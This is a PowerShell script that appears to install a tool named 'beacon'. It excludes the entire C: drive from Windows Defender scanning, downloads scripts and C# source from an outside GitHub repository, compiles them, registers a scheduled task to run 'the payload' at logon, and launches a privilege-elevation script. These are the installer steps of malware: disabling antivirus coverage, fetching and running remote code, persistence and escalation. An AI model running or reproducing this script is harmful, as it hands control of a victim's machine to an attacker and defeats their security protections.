# Excludes file paths
Add-MpPreference -ExclusionPath "C:\"

# Create the necessary directories
mkdir C:\temp
mkdir C:\temp\beacon
mkdir C:\temp\beacon\elevate

Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/elevate/elevinit.ps1 > C:\temp\beacon\elevate\elevinit.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/run.ps1 > C:\temp\beacon\run.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/GetState.ps1 > C:\temp\beacon\GetState.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/master/task.ps1 > C:\temp\beacon\task.ps1

# Compile the C# source code into a DLL
Set-Location C:\temp\beacon\elevate
.\compile.ps1

# Create a scheduled task to run the payload at logon
Set-Location C:\temp\beacon
.\task.ps1

# Execute the elevated console
Set-Location C:\temp\beacon\elevate
.\Elevate.ps1
